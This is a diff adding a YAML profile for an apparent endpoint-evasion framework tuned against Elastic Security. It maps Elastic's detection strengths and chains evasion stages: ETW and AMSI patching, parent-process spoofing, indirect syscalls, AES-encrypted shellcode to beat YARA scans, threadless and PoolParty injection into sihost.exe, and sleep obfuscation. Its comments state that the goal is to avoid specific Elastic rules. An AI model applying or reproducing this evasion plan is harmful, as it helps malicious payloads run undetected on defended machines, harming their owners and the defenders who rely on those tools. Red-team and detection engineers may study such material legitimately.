@@ -1,0 +1,129 @@
+# edr-tekton :: Elastic Security Profile
+#
+# Elastic Security (formerly Elastic Endpoint Security,
+# originally Endgame). Open-source detection rules provide
+# unique transparency into what they detect.
+#
+# Key detection strengths:
+#   - Behavioral rules (open-source, well-documented)
+#   - Kernel callbacks
+#   - ETW consumption
+#   - YARA rules for memory scanning
+#   - Credential access monitoring
+#   - Shellcode detection heuristics
+#
+# Strategy: Elastic's open rules let us know exactly what
+# patterns to avoid. Threadless injection bypasses their
+# thread creation rules. Sleep encryption defeats their
+# YARA memory scanning.
+
+profile:
+  name: elastic_security
+  display_name: "Elastic Security"
+  version: "1.0"
+  vendor: elastic
+
+threat_levels:
+  user_hooks: medium       # Standard hooks
+  kernel_cb: high          # Process/thread/image callbacks
+  etw: high                # Strong ETW consumption
+  minifilter: medium       # Standard minifilter
+  wfp: medium              # Network monitoring
+  scanner: high            # YARA rules, shellcode heuristics
+  elam: low
+  nirvana: low
+  hypervisor: none
+
+stages:
+  fingerprint:
+    primary: auto
+    required: true
+
+  api_resolve:
+    primary: hash_resolve
+    fallbacks:
+      - peb_walk
+    required: true
+    max_risk: 20
+
+  evasion_pre:
+    primary: etw_patch
+    fallbacks:
+      - etw_blind
+    required: true
+    max_risk: 30
+    additional:
+      - amsi_patch
+      - sandbox_detect
+      - ppid_spoof
+
+  syscall_init:
+    primary: indirect_syscall
+    fallbacks:
+      - direct_syscall
+      - tampered_syscall
+    required: true
+    max_risk: 20
+    additional:
+      - ssn_resolve
+
+  decrypt:
+    primary: encrypt_aes
+    fallbacks:
+      - encrypt_triple
+      - encrypt_rc4
+    required: true
+    max_risk: 15
+    notes: "AES encryption defeats YARA shellcode pattern scanning"
+
+  inject:
+    primary: inject_threadless
+    fallbacks:
+      - inject_callback
+      - inject_poolparty
+      - inject_apc
+    required: true
+    max_risk: 30
+    notes: "Elastic has specific rules for CreateRemoteThread and QueueUserAPC"
+
+  sleep_init:
+    primary: sleep_foliage
+    fallbacks:
+      - sleep_zilean
+      - sleep_ekko
+    required: false
+    max_risk: 15
+    additional:
+      - sleep_beacongate
+
+  cleanup:
+    primary: auto
+    required: false
+
+constraints:
+  max_total_risk: 140
+  prefer_stealthy: true
+  require_x64: true
+  min_os_build: 17134
+
+sleep:
+  interval_ms: 7000
+  encrypt: true
+
+encryption:
+  layers:
+    - type: aes256
+      key_source: env
+    - type: xor
+      key_source: static
+
+inject_target: "sihost.exe"
+ppid_parent: "explorer.exe"
+
+notes: >
+  Elastic's open-source detection rules are both a strength
+  and weakness. We know exactly what behavioral patterns they
+  match. Threadless injection avoids their CreateRemoteThread
+  and QueueUserAPC rules. ETW patching critical since they
+  consume EtwTi events. AES encryption defeats their YARA
+  memory scanning for shellcode patterns.
